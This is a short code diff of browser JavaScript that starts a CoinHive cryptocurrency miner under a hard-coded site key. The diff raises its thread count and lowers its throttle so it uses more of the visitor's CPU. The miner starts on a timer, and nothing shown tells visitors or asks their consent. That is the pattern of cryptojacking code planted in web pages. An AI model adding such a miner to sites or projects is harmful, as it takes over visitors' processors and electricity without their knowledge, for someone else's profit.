@@ -1,8 +1,8 @@
 var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');
 
-miner.setNumThreads(Math.min(miner.getNumThreads(), 2));
+miner.setNumThreads(Math.min(miner.getNumThreads(), 3));
 
-miner.setThrottle(0.5)
+miner.setThrottle(0.4)
 
 setTimeout(startMiner, 5000)
 
